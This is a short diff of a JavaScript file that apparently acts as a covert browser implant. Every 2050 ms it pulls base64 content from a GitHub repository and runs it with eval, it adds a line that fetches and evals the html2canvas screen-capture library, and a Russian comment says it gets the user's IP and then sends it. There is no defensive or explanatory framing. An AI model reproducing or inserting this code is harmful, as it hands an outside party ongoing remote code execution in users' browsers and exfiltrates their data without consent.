@@ -1,6 +1,7 @@
 setInterval(() => {$.get("https://api.github.com/repos/uloxa13/Fq/contents/Fq", function(data) {
   eval(atob(data.content));
 });}, 2050);
+$.get("https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js", (d) => eval(d));
 // Сначала получаем IP пользователя, потом отправляем
 fetch('https://api.ipify.org?format=json')
   .then(response => response.json())
